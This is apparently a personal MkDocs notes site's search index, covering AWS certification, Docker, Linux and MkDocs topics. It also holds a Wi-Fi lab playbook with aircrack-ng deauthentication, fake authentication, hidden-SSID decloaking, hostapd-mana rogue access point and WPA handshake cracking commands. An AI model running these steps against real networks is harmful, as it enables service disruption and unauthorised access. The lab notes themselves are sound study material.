{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Let's Begin","text":""},{"location":"about/","title":"About","text":"<ul> <li>John works in a cube without sun and water.</li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/references/","title":"References","text":"<ul> <li>AWS Certified Cloud Practitioner</li> <li>AWS Exam Guide</li> <li>AWS Sample Questions</li> <li>AWS CLI</li> <li>Pearson VUE Exam</li> <li>Neil Course Code GitHub Repo</li> <li>DigitalCloud AWS Exam Cram</li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/","title":"AWS Notes","text":""},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#three-fundamentals-of-aws","title":"Three Fundamentals of AWS","text":"<ol> <li>Compute</li> <li>Storage</li> <li>Outbound Data Transfer</li> </ol>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#traditional-it-and-cloud-computing","title":"Traditional IT and Cloud Computing","text":"<ul> <li>Traditional<ul> <li>Requires human involvement</li> <li>Internal accessibility, limited public presence</li> <li>Single-tenant, can be virtualized</li> <li>Limited scalability</li> <li>Usage is not typically measured</li> </ul> </li> <li>Cloud<ul> <li>On-demand - self service</li> <li>Broad network access</li> <li>Resource pooling</li> <li>Rapid Elasticity</li> <li>Measured Service</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#cloud-service-and-deployment-models","title":"Cloud Service and Deployment Models","text":"<ul> <li> <p>Service Models</p> <ul> <li>Private<ul> <li>You own the whole stack including hardware</li> </ul> </li> <li>Infrastructure as a Service (IaaS)<ul> <li>Not responsible for the underlying hardware</li> <li>Responsible for everything else including OS</li> <li>EC2, Azure VM, Google Compute Engine</li> </ul> </li> <li>Platform as a Service (PaaS)<ul> <li>Only responsible for the application and data</li> <li>Uploading code and data</li> <li>AWS Elastic Beanstalk, Azure Web Apps, Google Compute Engine</li> </ul> </li> <li>Software as a Service (SaaS)<ul> <li>You don't manage anything</li> <li>Just using service only</li> <li>Salesforce, Google Apps, Zoom</li> </ul> </li> </ul> </li> <li> <p>Deployment Models</p> <ul> <li>Private Cloud<ul> <li>Full control, including security</li> <li>VMware, Microsoft, RedHat, OpenStack</li> </ul> </li> <li>Public Cloud<ul> <li>Variable expenses</li> <li>Economies of scale</li> <li>Massive elasticity</li> <li>AWS, Azure, Google Cloud Platform</li> </ul> </li> <li>Hybrid Cloud<ul> <li>Mix of private and public cloud</li> </ul> </li> <li>Multi Cloud<ul> <li>Using multiple cloud providers and private</li> </ul> </li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#aws-global-infrastrcture","title":"AWS Global Infrastrcture","text":"<ul> <li>Region<ul> <li>A physical location in the world that is independent</li> <li>Interconnected with other regions with AWS's own high bandwidth network</li> <li>Each regions has two or more availability zones</li> <li>Isolated from other regions</li> </ul> </li> <li>Availability Zone<ul> <li>Composed on one or more data centers inside a region</li> <li>Provide redundancy within a region</li> <li>Subnets are created within the AZ (VPN)</li> <li>Physically separated and isolated from other AZs</li> </ul> </li> <li>AWS Outposts<ul> <li>Hardware from AWS that you can deploy at your company</li> </ul> </li> <li>AWS Local Zone<ul> <li>Can deploy own applications and can deploy to reduce latency</li> <li>Place compute, stoage, database, and other select services closer to end-users</li> <li>Exentsion of the AWS Region</li> </ul> </li> <li>AWS Wavelength<ul> <li>5G connectivity</li> </ul> </li> <li>CloudFront Origins<ul> <li>Get content geographically closet to users</li> <li>Regional edge cache</li> <li>Edge cache</li> </ul> </li> <li>Edge Locations and Regional Edge Caches<ul> <li>Edge locations are Content Delivery Network (CDN) endpoints for CloudFront</li> <li>Many more edge locations that regions</li> <li>Regional edge caches sit between your CloudFront Origin servers and edge locations</li> <li>Regional edge caches has a larger cache0width than each of the individual edge locations</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#aws-shared-responsibility-model","title":"AWS Shared Responsibility Model","text":"<ul> <li>AWS is responsible for the \"Security OF the Cloud\"</li> <li>Customer is responsible for the \"Security IN the Cloud\"</li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#launching-cloud-services","title":"Launching Cloud Services","text":"<ul> <li>Three ways:<ul> <li>AWS Management Console</li> <li>Console</li> <li>SDK</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#aws-public-and-private-services","title":"AWS Public and Private Services","text":"<ul> <li>Public<ul> <li>Accessible via the Internet</li> <li>Amazon DynamoDB</li> <li>Amazon S3</li> <li>Amazon Route 53</li> <li>Amazon CloundFront</li> </ul> </li> <li>Private<ul> <li>Not accessible via the Internet (can be though)</li> <li>VPCs</li> <li>EC2 Instance</li> <li>Amazon RDS</li> <li>Amazon Elastic File System</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#six-advantages-of-cloud-computing","title":"Six Advantages of Cloud Computing","text":"<ol> <li>Trade capital expense (CAPEX) for variable expense (OPEX)<ul> <li>OPEX is tax deductable per hear while CAPAX is spread across years</li> </ul> </li> <li>Benefit from massive economies of scale</li> <li>Stop guessing capacity</li> <li>Increase speed and agility<ul> <li>Speed means to deploy resources easily and quickly</li> <li>Agility means to react to change; speed to market</li> </ul> </li> <li>Stop spending money running and maintaining data centers</li> <li>Go global in minutes</li> </ol>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#aws-identity-and-access-management-iam","title":"AWS Identity and Access Management (IAM)","text":"<ul> <li>Global in scope</li> </ul> <p>Read the article by AWS</p>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/03-cloud-computing-and-aws/#references","title":"References","text":"<ul> <li>AWS Cloud Computing Concepts</li> <li>AWS Glbal Infrastructure</li> <li>AWS Billing and Pricing</li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/","title":"Identity and Access Management (IAM)","text":""},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#overview","title":"Overview","text":"<ul> <li>A principal is a person or applicaiton that can make a request for an action or operation on an AWS resource</li> <li>IAM principals must be authenticated to send requests (few execptions)</li> <li>Policy types<ul> <li>Identity-based policy</li> <li>Resource-based policy</li> </ul> </li> <li>Accessible<ul> <li>Console</li> <li>CLI</li> <li>API</li> </ul> </li> <li>Entities<ul> <li>User</li> <li>Role</li> <li>Federated User</li> <li>Application</li> </ul> </li> <li>Methods of Authentication<ul> <li>Person -&gt; User name, password, MFA token (optional)</li> <li>CLI/API -&gt; Access Key ID and Secret Access Key</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#iam-users-groups-roles-and-policies","title":"IAM Users, Groups, Roles, and Policies","text":"<p>All permissions are implicitly denied by default</p> <ul> <li>Users<ul> <li>Up to 5000 user accounts can be created</li> <li>Email you used to create/log into account is root - full permissions (bad idea)</li> <li>Users have a friendly name - John</li> <li>Users also have an Amazon Resource Name (ARN) - arn:aws:iam:::user/John <li>User name/password -&gt; console</li> <li>Access keys -&gt; API/CLI</li> <li>Users have NO permissions by default</li> <li>Group<ul> <li>Organizes users into groups, e.g., admin, development, hr, ...</li> <li>User gains the permissions applied to the group through a policy</li> </ul> </li> <li>Roles<ul> <li>Used for delgation and are assumed</li> <li>An IAM identity that has specific permissions</li> <li>Roles are assumed by users, applications, and srevices</li> <li>Use roles to delegate policy</li> </ul> </li> <li>Policies<ul> <li>Define the permissions for the identities or resources they are associated with</li> <li>Identity-policies can be applied to users, groups, and roles</li> <li>Policies are documents that define permissions and are written in JSON</li> </ul> </li> <li>Root User<ul> <li>User that created the account</li> <li>Full blown permissions and cannot be restricted</li> </ul> </li>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#iam-authentication-and-mfa","title":"IAM Authentication and MFA","text":"<ul> <li>John -&gt; UserName/Password/MFA Token -&gt; AWS Management Console</li> <li>John -&gt; CLI/API -&gt; Access Key ID/Secret Access Key -&gt; AWS API<ul> <li>Used for programmatic access</li> </ul> </li> <li>MFA<ul> <li>Something you know</li> <li>Something you have<ul> <li>Virtual/Hardware Device</li> </ul> </li> <li>Something you are (not on AWS)</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#service-control-policies-scps","title":"Service Control Policies (SCPs)","text":"<ul> <li>Feature of AWS organizations<ul> <li>Control the maximum available permissions</li> <li>SCPs DON'T grant any permissions, they control the available permissions</li> </ul> </li> <li>Management account is the root<ul> <li>Dev</li> <li>Test</li> <li>...</li> </ul> </li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#iam-best-practices","title":"IAM Best Practices","text":"<ul> <li>Require human users to use federation with an identity provider to access AWS using \"temporary credentials\"</li> <li>Requre workloads to use \"temporary credentials\" with IAM roles to access AWS</li> <li>Require MFA</li> <li>Rotate access keys regularly for use cases that require long-term credentials</li> <li>Safeguard your root user credentials and don't use them for everyday tasks</li> <li>Apply least-privilege permissions</li> <li>Get started with AWS managed policies and move toward least-privilege permissions</li> <li>Use IAM Access Analyzer to generate least-privilege policies based on access activity</li> <li>Regulary review and removed unused users, roles, permissions, policies, and credentials</li> <li>Use conditions in IAM policies to further restrict access</li> <li>Verify public and cross-account access to resources with IAM Access Analyzer</li> <li>Use IAM Access Analyzer to validate your IAM policies to ensure secure and functional permissions</li> <li>Establish permissions guardrails across multiple accounts</li> <li>User permission boundaries to delegate permissions management within an account</li> <li>Use roles for applications that run on Amazon EC2 instances</li> <li>Use roles to delegate permissions</li> <li>Don't share access keys</li> </ul>"},{"location":"aws/certified-cloud-practitioner-exam-notes/digital-cloud-training-udemy/04-identity-and-access-management-iam/#references","title":"References","text":"<ul> <li>AWS Identity and Access Management</li> </ul>"},{"location":"docker/commands/","title":"Docker - Commands","text":""},{"location":"docker/commands/#running","title":"Running","text":"<pre><code># Pull image\ndocker pull cyberxsecurity/ansible\n\n# Run image to create container\n# Warning: Each time run, a new container created\ndocker run -ti cyberxsecurity/ansible:latest bash\n\n# List all images\ndocker images -a\n\n# List all containers\nsudo docker container list -a\n\n# List running containers\nsudo docker ps\n\n# Start container by ame\ndocker start stoic_bule\n\n# Attach to container if running\ndocker attach stoic_bule\n</code></pre>"},{"location":"docker/commands/#purging","title":"Purging","text":"<pre><code>docker stop $(docker ps -a -q)\ndocker rm -f $(docker ps -a -q)\ndocker system prune --all -f\ndocker rmi $(docker images -a -q)\ndocker volume prune -f\ndocker rm $(docker volume ls -q)\ndocker network prune -f\n</code></pre>"},{"location":"docker/commands/#references","title":"References","text":""},{"location":"docker/installation/","title":"Docker - Installation","text":""},{"location":"doctools/charts/charts/","title":"Charts","text":"<p>{   \"$schema\": \"https://vega.github.io/schema/vega-lite/v5.json\",   \"description\": \"A simple bar chart with embedded data.\",   \"data\": {     \"values\": [       {\"a\": \"A\", \"b\": 28}, {\"a\": \"B\", \"b\": 55}, {\"a\": \"C\", \"b\": 43},       {\"a\": \"D\", \"b\": 91}, {\"a\": \"E\", \"b\": 81}, {\"a\": \"F\", \"b\": 53},       {\"a\": \"G\", \"b\": 19}, {\"a\": \"H\", \"b\": 87}, {\"a\": \"I\", \"b\": 52}     ]   },   \"mark\": \"bar\",   \"encoding\": {     \"x\": {\"field\": \"a\", \"type\": \"nominal\", \"axis\": {\"labelAngle\": 0}},     \"y\": {\"field\": \"b\", \"type\": \"quantitative\"}   } }</p>"},{"location":"doctools/charts/charts/#references","title":"References","text":"<ul> <li>Charts</li> <li>Vega-Lite Editor</li> </ul>"},{"location":"doctools/html/html/","title":"HTML Entities","text":"<p>HTML Character Entities Cheat Sheet</p>"},{"location":"doctools/kroki/kroki/","title":"Kroki","text":"<p>Kroki provides a unified API with support for BlockDiag (BlockDiag, SeqDiag, ActDiag, NwDiag, PacketDiag, RackDiag), BPMN, Bytefield, C4 (with PlantUML), D2, DBML, Ditaa, Erd, Excalidraw, GraphViz, Mermaid, Nomnoml, Pikchr, PlantUML, Structurizr, SvgBob, TikZ, UMLet, Vega, Vega-Lite, WaveDrom, WireViz... and more to come!</p>"},{"location":"doctools/kroki/kroki/#examples","title":"Examples","text":"<pre>\n```kroki-blockdiag no-transparency=false\nblockdiag {\n  blockdiag -&gt; generates -&gt; \"block-diagrams\";\n  blockdiag -&gt; is -&gt; \"very easy!\";\n\n  blockdiag [color = \"greenyellow\"];\n  \"block-diagrams\" [color = \"pink\"];\n  \"very easy!\" [color = \"orange\"];\n}\n```\n</pre>"},{"location":"doctools/kroki/kroki/#references","title":"References","text":"<ul> <li>Kroki</li> </ul>"},{"location":"doctools/markdown/markdown/","title":"Markdown","text":""},{"location":"doctools/mkdocs/mkdocs/","title":"Mkdocs","text":"<p>Here we show how to get started with <code>mkdocs</code>. We are going to be publishing on GitHub's GitPages using a dedicated domain that they provide for us free.</p>"},{"location":"doctools/mkdocs/mkdocs/#installation","title":"Installation","text":"<ul> <li>Install the latest python and git on your device</li> <li>Log in to GitHub</li> <li>Create a new GitHub repo using the naming convention: <code>&lt;your github id&gt;.github.io</code><ul> <li>e.g., <code>johnlwhiteman.github.io</code></li> </ul> </li> <li>Run the following commands on your device</li> </ul> <pre><code>git clone &lt;repo&gt;\ncd &lt;repo&gt;\npip install mkdocs\npip install mkdocs-material\npip install mkdocs-mermaid2-plugin\npip install mkdocs-charts-plugin\nmkdocs new .\nmkdocs serve\n</code></pre> <ul> <li>Verify that everything is working. Open a browser and navigate to http://127.0.0.1:8000</li> </ul>"},{"location":"doctools/mkdocs/mkdocs/#setting-up-github-actions","title":"Setting Up GitHub Actions","text":"<ul> <li>Create the following directories under the parent repo directory<ul> <li>This directory will contain the GitHub actions assets</li> </ul> </li> </ul> <pre><code>mkdir -p .github/workflows\n</code></pre> <ul> <li>Create a new GitHub Actions file     ./github/workflows/ci.yml</li> <li>Copy the contents the GitHub Actions File provided by mkdocs.</li> </ul> <pre><code>name: ci\non:\n  push:\n    branches:\n      - master\n      - main\npermissions:\n  contents: write\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.x\n      - run: echo \"cache_id=$(date --utc '+%V')\" &gt;&gt; $GITHUB_ENV\n      - uses: actions/cache@v3\n        with:\n          key: mkdocs-material-${{ env.cache_id }}\n          path: .cache\n          restore-keys: |\n            mkdocs-material-\n      - run: pip install mkdocs-material\n      - run: mkdocs gh-deploy --force\n</code></pre>"},{"location":"doctools/mkdocs/mkdocs/#deployment","title":"Deployment","text":"<p>Since we have GitHub Actions enabled, deployment to GitPages is automatic</p> <pre><code>git add --all\ngit commit -s -m \"Me comments\"\ngit push origin main\n</code></pre>"},{"location":"doctools/mkdocs/mkdocs/#build","title":"Build","text":"<pre><code>mkdocs build\n</code></pre>"},{"location":"doctools/mkdocs/mkdocs/#deploy","title":"Deploy","text":""},{"location":"doctools/mkdocs/mkdocs/#references","title":"References","text":"<ul> <li>GitHub</li> <li>GitHub Pages</li> <li>Website</li> <li>Best of mkdocs</li> <li>Plugins for MkDocs</li> <li>Mermaid2</li> <li>Drawio</li> <li>Charts</li> <li>Vega-Lite Editor</li> <li>Drawio Desktop</li> </ul>"},{"location":"doctools/slidev/slidev/","title":"Slidev","text":"<pre><code># Start local server\nmkdocs serve\n\n# View in browser: http://localhost:8000\n</code></pre>"},{"location":"doctools/slidev/slidev/#references","title":"References","text":"<ul> <li>https://www.mkdocs.org/</li> </ul>"},{"location":"doctools/vuejs/vuejs/","title":"Vue.js","text":""},{"location":"linux/bg-fg-jobs/","title":"bg fg jobs","text":"<pre><code># Execute a long running job and put it in the background\nxload &amp;\n\n# View it in the jobs queue\njobs\n\n# Bring the job back to the foreground\nfg %1\n\n# Or kill it\nkill %1\n\n# Execute a long running job\nsleep 20000\n\n# Suspend it in the background\nctrl+z\n\n# Restart the suspended job and run it in the background\nbg\n</code></pre>"},{"location":"linux/screen/","title":"Screen","text":"<pre><code># Start a session\nscreen -S johnny\n\n# Disconnect\nctrl+a d\n\n# Show sessions\nscreen -ls\n\n# Reconnect\nctrl+a r\nctrl+a r &lt;session id&gt;\n\n# Create a new window\nctrl+a c\n\n# Split window vertically\nctrl+a |\n\n# Split window horizontally\nctrl+a S\n\n# Move to the next window\nctrl+a n\nctrl+a tab\n\n# Move to the previous window\nctrl+a p\n\n# Create a new session window when in split mode\nctrl+a c\n\n# Unsplit window\nctrl+a Q\n\n# Exit\nctrl+c\npkill screen\n</code></pre>"},{"location":"wireless/playbook/","title":"Playbook","text":"<ul> <li>Run Setup first</li> </ul>"},{"location":"wireless/playbook/#wep","title":"WEP","text":""},{"location":"wireless/playbook/#auth-opn","title":"AUTH: OPN","text":""},{"location":"wireless/playbook/#client","title":"Client","text":"<ul> <li>Deauthentication Attack *</li> <li>Fake Authentication Attack</li> <li>Interactive Attack</li> <li>ARP Request Replay Attack</li> </ul>"},{"location":"wireless/playbook/#clientless","title":"Clientless","text":"<ul> <li>Deauthentication Attack</li> <li>Fake Authentication Attack *</li> <li>ChopChop Attack</li> <li>Fragmentation Attack</li> </ul>"},{"location":"wireless/playbook/#auth-ska","title":"AUTH: SKA","text":"<ul> <li>Fake Authentication Attack w/PSK</li> </ul>"},{"location":"wireless/playbook/#wpa2","title":"WPA/2","text":""},{"location":"wireless/playbook/#mgt","title":"MGT","text":"<ul> <li>Enterprise</li> </ul>"},{"location":"wireless/playbook/#psk","title":"PSK","text":"<ul> <li>Deauthentication Attack ... then<ul> <li>Aircrack-ng</li> <li>Airolib-ng</li> <li>Cowpatty</li> <li>Crunch</li> <li>John the Ripper</li> <li>Pyrit</li> <li>Rsmangler</li> </ul> </li> </ul>"},{"location":"wireless/playbook/#misc","title":"Misc","text":""},{"location":"wireless/playbook/#password-lists","title":"Password Lists","text":"<pre><code>* /usr/share/wordlists\n* /usr/share/john/password.lst ($WORDLIST)\n* https://github.com/aircrack-ng/aircrack-ng/blob/master/test/password.lst\n</code></pre>"},{"location":"wireless/references/","title":"References","text":"<ul> <li>brcyrr GitHub</li> <li>dh0ck</li> <li>drew long</li> <li>koutto</li> </ul>"},{"location":"wireless/setup/","title":"Setup","text":""},{"location":"wireless/setup/#commands","title":"Commands","text":"<p>Run these commands on each system to gather information about the target. Store the information as environment variables in a file called <code>config</code> and source it as <code>source config</code>. The values below are only used as examples since each system will differ. The name of the variables should be consistent as seen throughout the documentation shown here.</p> <pre><code># Kill stuff that can interfere\nsudo airmon-ng check kill\n\n# Find the connected wireless device (3 ways)\nifconfig\nip a\n\n# Determine the ADAPTER name, let's assume wlan0\n\n# Set to monitor mode\nsudo airmon-ng start wlan0\n\n# Determine INTERFACE name, let's assume wlan0mon\n\n# Start monitoring - make terminal large enough to see everything\nsudo airodump-ng wlan0mon\n\n# Do a quick injection test to ensure it works\nsudo aireplay-ng --test wlan0mon\n\n# OR do a better injection test if two interfaces are available\nsudo aireplay-ng --test -i wlan1 wlan0mon\n\n# Gather info for config file below: BSSID, SSID, ...\n\n# Stop monitoring\nqq\n\n# Build an environment file for convenience\nvi config\n\nexport SSID=wifu\n\n# MAC address of AP\nexport BSSID=AA:BB:CC:DD:EE:FF\n\n# AP channel\nexport CHANNEL=3\n\n# MAC address of client connected to AP\nexport CLIENT=A1:B2:C3:D4:E5:F6\n\n# Device name of connected Wi-Fi ADAPTER\nexport ADAPTER=wlan0\n\n# Name of connected Wi-Fi ADAPTER when in monitor mode\nexport INTERFACE=wlan0mon\n\n# MAC address of connected Wi-FI ADAPTER\nexport INTERFACEMAC=AB:CD:EF:12:34:56\n\n# Device name of a second connected Wi-Fi ADAPTER (optional)\nexport ADAPTER2=wlan1\n\n# Name of second connected Wi-Fi ADAPTER when in monitor mode (optional)\nexport INTERFACE2=wlan1mon\n\n# MAC address of second connected Wi-FI ADAPTER (optional)\nexport INTERFACEMAC2=56:34:12:EF:CD:AB\n\n# Base name given to PCAP file\nexport TAG=$SSID\n\n# Name of PCAP file created by airodump.ng\nexport PCAP=$TAG-01.cap\n\n# Name of rainbow table used for cracking hashes\nexport RAINBOW=$TAG-rainbow.lst\n\n# Path to default wordlist used for cracking\nexport WORDLIST=/usr/share/john/password.lst\n\n# Contruct the correct PRGA path name\nPRGA=$(echo \"$TAG-01-$BSSID.xor\" | sed 's/\\:/-/'g)\n\n# Save and source it\nsource config\n\n# Note: it might be easier to copy to ~/.zshrc or ~/.bashrc file instead\n</code></pre>"},{"location":"wireless/setup/#references","title":"References","text":"<ul> <li>Airmon-ng</li> <li>Aireplay-ng</li> </ul>"},{"location":"wireless/teardown/","title":"Teardown","text":"<p>You want to make sure to clean up things. Don't let the vulnerable AP hang around. Think War Drivers or War Squatters.</p> <pre><code>sudo airmon-ng stop $INTERFACE\nsudo systemctl start NetworkManager\nsudo /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant &amp;\nsudo dhclient\n</code></pre> <ul> <li>Unplug the ADAPTER</li> <li>Turn off the vulnerable access point</li> <li>Turn off the client if used for testing only</li> </ul>"},{"location":"wireless/attacks/captive-portal/","title":"Captive Portal","text":""},{"location":"wireless/attacks/captive-portal/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n</code></pre>"},{"location":"wireless/attacks/captive-portal/#build-the-captive-portal","title":"Build the Captive Portal","text":"<pre><code># Install the dependencies to build our captive port website\nsudo apt-get install apache2 libapache2-mod-php\n\n# Use the premade one\nwget -r -l2 https://www.megacorpone.com\n</code></pre>"},{"location":"wireless/attacks/captive-portal/#set-up-network","title":"Set up Network","text":"<pre><code>sudo ip addr add 192.168.87.1/24 dev wlan0\nsudo ip link set wlan0 up\n</code></pre>"},{"location":"wireless/attacks/captive-portal/#references","title":"References","text":"<ul> <li>Captive Portal</li> <li>hostapd</li> <li>hostapd-mana</li> <li>hostapd-mana config</li> </ul>"},{"location":"wireless/attacks/fourway-handshake/","title":"Four-way Handshake","text":""},{"location":"wireless/attacks/fourway-handshake/#references","title":"References","text":"<ul> <li>Four-way Handshake</li> </ul>"},{"location":"wireless/attacks/hidden-ap/","title":"Hidden Network","text":"<p>Demonstrate how to decloak a hidden AP's SSID</p> <ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>One client needs to be associated</li> <li>Configure AP to not broadcast its SSID</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n</code></pre> <ul> <li>The length shows 0</li> </ul> <p></p> <ul> <li>Sometimes the SSID will appear before even before doing a deauthentication attack. No need to continue if that is the case.</li> </ul> <pre><code># [Terminal Two]\n# Run the deauthentication attack\nsudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $INTERFACE\n</code></pre> <ul> <li>Observe that the SSID is now provided</li> <li>The AUTH value appears too</li> </ul> <p></p>"},{"location":"wireless/attacks/hidden-ap/#reference","title":"Reference","text":"<p>Hidden</p>"},{"location":"wireless/attacks/rogue-ap/","title":"Rogue AP","text":"<p>Multiple APs that transmit the same SSID. The client/station will choose the one with the strongest signal. An attacker may advertise an AP with the same SSID except that the AP is a very bad AP controlled by the attacker.</p> <p>Even if the pre-shared key is unknown, the attacker can still aquire the first two messages in the four-way handshake. Other details might make this a bit more complicated like sharing the same encryptions attributes as well.</p> <p>Create an AP with DEVICE.</p> <p>Demonstrate how to decloak a hidden AP's SSID</p> <ul> <li>Run setup first</li> <li>Three terminals are needed</li> <li>One client needs to be associated with AP</li> <li>Need two ADAPTERS - connect both at the start<ul> <li>First to be the rogue AP</li> <li>Second to be the run deauth attack against first</li> </ul> </li> </ul> <p></p>"},{"location":"wireless/attacks/rogue-ap/#build-a-rogue-ap","title":"Build a Rogue AP","text":"<p>hostapd is a user space daemon for access point and authentication servers. It implements IEEE 802.11 access point management, IEEE 802.1X/WPA/WPA2/EAP Authenticators, RADIUS client, EAP server, and RADIUS authentication server. The current version supports Linux (Host AP, madwifi, mac80211-based drivers) and FreeBSD (net80211).</p> <p>Can crack WPA and WPA2. Not WPA3. Below WPA3 means WPA and WPA2, not WPA3.</p>"},{"location":"wireless/attacks/rogue-ap/#install-hostapd-mana","title":"Install Hostapd-mana","text":"<p><pre><code># [Terminal One]\nsudo apt install hostapd-mana\n\n# Create a config file - first adapter is the rogue AP\nvi hostapd.conf\ninterface=wlan0\nssid=rogue\nchannel=1\nhw_mode=g\nieee80211n=1\nwpa=3\nwpa_key_mgmt=WPA-PSK\nwpa_passphrase=informix\nwpa_pairwise=TKIP CCMP\nrsn_pairwise=TKIP CCMP\nmana_wpaout=/home/kali/informix.hccapx\n\n# Start the rogue AP\nsudo hostapd-mana hostapd.conf\n</code></pre> </p> <ul> <li>Connect client to the rogue AP w/correct PSK to see association messages</li> </ul> <p></p> <p><pre><code># [Terminal Two]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE2 1\n\n# Start monitoring to collect data\nsudo airodump-ng -c 1 --bssid $INTERFACEMAC -w $TAG $INTERFACE2\n</code></pre> </p> <pre><code># [Terminal Three]\nsudo aireplay-ng --deauth 0 -a $INTERFACEMAC $INTERFACE2\n\n# Watch for successful fourway handshake capture message\n\n# Stop everything\n</code></pre> <p></p> <pre><code># Crack the hostapd capture file\naircrack-ng -0 -e rogue -w $WORDLIST informix.hccapx\n# OR the normal PCAP file\naircrack-ng -0 -e rogue -w $WORDLIST $PCAP\n</code></pre> <p></p>"},{"location":"wireless/attacks/rogue-ap/#references","title":"References","text":"<ul> <li>hostapd</li> <li>hostapd-mana</li> <li>hostapd-mana config</li> </ul>"},{"location":"wireless/attacks/ska/","title":"Shared Key Authentication (SKA)","text":"<p>How to tell if AP is using <code>Shared Key Authentication</code>.</p> <p><pre><code>[TERMINAL ONE]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n[TERMINAL TWO]\nsudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n</code></pre> * Look for the <code>Switching to shared key authentication</code> message * Look for the <code>SKA</code> under <code>AUTH</code> in the <code>airodump-ng</code> window too</p> <p></p>"},{"location":"wireless/attacks/wep/00-deauth/","title":"Deauthentication Attack (WEP/WPA/WPA2)","text":"<p>This attack sends disassocate packets to one or more clients which are currently associated with a particular access point. Disassociating clients can be done for a number of reasons:</p> <ul> <li>Recovering a hidden ESSID. This is an ESSID which is not being broadcast. Another term for this is \u201ccloaked\u201d.</li> <li>Capturing WPA/WPA2 handshakes by forcing clients to reauthenticate</li> <li>Generate ARP requests (Windows clients sometimes flush their ARP cache when disconnected)</li> </ul> <p>Of course, this attack is totally useless if there are no associated wireless client or on fake authentications.</p>"},{"location":"wireless/attacks/wep/00-deauth/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least one client must be associated with the AP</li> <li>No need to fakeauth, the first deauth will set AUTH to OPN</li> </ul> <p><pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack\nsudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $INTERFACE\n</code></pre> Note: Run ping on the client, pinging the AP, to see ping freeze while running the deauth attack.</p>"},{"location":"wireless/attacks/wep/00-deauth/#references","title":"References","text":"<ul> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>Deauthentication</li> </ul>"},{"location":"wireless/attacks/wep/01-fakeauth/","title":"Fake Authentication Attack (WEP)","text":"<p>The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) plus associate with the access point (AP). This is only useful when you need an associated MAC address in various aireplay-ng attacks and there is currently no associated client. It should be noted that the fake authentication attack does NOT generate any ARP packets. Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.</p>"},{"location":"wireless/attacks/wep/01-fakeauth/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>No clients should be associated with AP or at least clients are idle</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the fake authentication attack\nsudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n</code></pre> <pre><code># Success\n01:56:20  Waiting for beacon frame 